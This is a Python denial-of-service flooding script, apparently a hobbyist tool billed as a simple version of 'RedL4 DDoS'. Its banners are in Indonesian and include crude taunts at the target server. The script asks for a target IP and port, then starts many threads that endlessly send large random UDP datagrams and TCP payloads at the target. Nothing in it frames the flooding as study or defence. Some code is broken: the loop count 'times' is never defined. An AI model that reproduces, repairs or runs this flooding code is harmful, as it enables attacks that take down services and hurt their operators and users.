#Simple Version Of RedL4 DDoS
import random
import socket
import struct
import threading
import time
import os,sys
import random, socket, threading
import codecs
print("\033[1;36;40m Loading")
time.sleep(2)
os.system("clear")

print(""" 
 ██████╗░░█████╗░██████╗░██╗░░░░░░█████╗
 ██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔══██
 ██████╔╝███████║██████╦╝██║░░░░░██║░░██
 ██╔═══╝░██╔══██║██╔══██╗██║░░░░░██║░░██
 ██║░░░░░██║░░██║██████╦╝███████╗╚█████╔
 ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚══════╝░╚════╝
 
 Terus Lah Maju Untuk Menggapai Cita-Cita
 -PabloGanz:v
 """)
print("")
   
print (" \033[31mEnter IP/Host")
ip = str(input(" IP : "))

print (" Enter Port")
port = int(input(" Port : "))
os.system("clear")
time.sleep(1)

print("""
 
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

 Mempersiap Kan Packet Untuk Menembus Server Kontol

 Ingat Kata Kata Ini
 Jangan Lah Kau Menyerang Server Kecil Kawan:)
""")
time.sleep(3)

def xxxxxx():
  data = random._urandom(10799)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
      print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")

def xxxxx():
  data = random._urandom(10299)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
           print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")

def xxxx():
  data = random._urandom(11077)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
           print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")

def xxx():
  data = random._urandom(31611)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
      s.close()
      print("[!] MATI LU SERVER NGENTOD")

def xx():
  data = random._urandom(10166)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
      s.close()
      print("[!] SERVER LEMAH JANCOKK")

def x():
  data = random._urandom(18944)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
    except:
      s.close()
      print("[!] SERVER MU LEMAH SEKALI")

for y in range(port):
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
else:
    th = threading.Thread(target = xxx)
    th.start()
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()
